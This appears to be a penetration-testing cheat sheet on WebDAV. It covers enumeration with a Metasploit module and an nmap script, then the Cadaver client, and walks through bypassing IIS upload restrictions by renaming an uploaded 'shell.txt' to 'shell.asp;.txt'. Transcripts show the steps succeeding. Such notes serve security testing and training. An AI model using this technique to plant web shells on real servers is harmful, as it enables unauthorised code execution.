# Cadaver
Cadaver is a shell tool for WebDAV.

*cadaver supports file upload, download, on-screen display, namespace operations (move and copy), collection creation and deletion, and locking operations.
Its operation is similar to the standard BSD ftp(1) client and the Samba Project's smbclient(1). A user familiar with these tools should be quite comfortable with cadaver.*

To do some enumeration if webDAV is enabled, try the following scans with Metasploit and NMAP.
## Metasploit Scan for WebDAV

The webdav_test module from [here](https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb) is required. Simply add it into the Metasploit modules directory to use it.
```
msf5 auxiliary(scanner/webdav_test) > run
[*] X.X.X.X/_vti_pvt/ (Microsoft-IIS/6.0) has unknown ENABLED
[*] X.X.X.X/_vti_pvt/ (Microsoft-IIS/6.0) Allows Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] X.X.X.X/_vti_pvt/ (Microsoft-IIS/6.0) Has Public Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] X.X.X.X/_vti_pvt/ exposed ips X.X.X.X
[*] X.X.X.X/_vti_pvt/ exposed paths http://X.X.X.X/_vti_pvt/,http://X.X.X.X/_vti_pvt/access.cnf,http://X.X.X.X/_vti_pvt/botinfs.cnf,http://X.X.X.X/_vti_pvt/bots.cnf,http://X.X.X.X/_vti_pvt/deptodoc.btr,http://X.X.X.X/_vti_pvt/doctodep.btr,http://X.X.X.X/_vti_pvt/frontpg.lck,http://X.X.X.X/_vti_pvt/linkinfo.btr,http://X.X.X.X/_vti_pvt/service.cnf,http://X.X.X.X/_vti_pvt/service.lck,http://X.X.X.X/_vti_pvt/services.cnf,http://X.X.X.X/_vti_pvt/svcacl.cnf,http://X.X.X.X/_vti_pvt/uniqperm.cnf,http://X.X.X.X/_vti_pvt/writeto.cnf
[*] Attempting to create /_vti_pvt/WebDavTest_T3Dw93X32F
[*] X.X.X.X/_vti_pvt/ is WRITEABLE
[*] Checking extensions for upload and execution
[*] Attempting to use IIS rename/copy to bypass restrictions
[*] Attempting to cleanup /_vti_pvt/WebDavTest_T3Dw93X32F
[*] Uploadable files are: cfm,html,jhtml,jsp,php,pl,txt
[*] Executable files are: html,txt
[*] IIS rename/executable files are: asp,html,txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/webdav_test) >
```
## NMAP NSE Scan for WebDAV
You can use `nmap` to perform a [webdav scan](https://nmap.org/nsedoc/scripts/http-webdav-scan.html) with the following syntax:

```
root@kali:~# nmap --script http-webdav-scan -p80,8080 <target>
```

A Patch must be used to compile this in Kali: [skullsecurity.org/blogdata/cadaver-0.23.2-h4x.patch](http://www.skullsecurity.org/blogdata/cadaver-0.23.2-h4x.patch)

```
root@kali:~/pwnt/metasploit-framework/exploits/X.X.X.X/cadaver-0.23.2# ./cadaver X.X.X.X
dav:/> 
```

To attempt to bypass file type restriction upload:

1. upload the file as `shell.txt`
2. move / copy the file `shell.txt` to `shell.asp;.txt`

```
## Cadaver Shell Syntax
dav:/_vti_pvt/> copy win3333.txt win3333.asp;.txt
Copying `/_vti_pvt/win3333.txt' to `/_vti_pvt/win3333.asp%3b.txt':  failed:
400 Bad Request
dav:/_vti_pvt/> move win3333.txt win3333.asp;.txt
Moving `/_vti_pvt/win3333.txt' to `/_vti_pvt/win3333.asp%3b.txt':  succeeded.
dav:/_vti_pvt/> 
```
## References Further Reading
* [http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html](http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html)
* [https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb](https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb)
* [http://code.google.com/p/davtest/](http://code.google.com/p/davtest/)
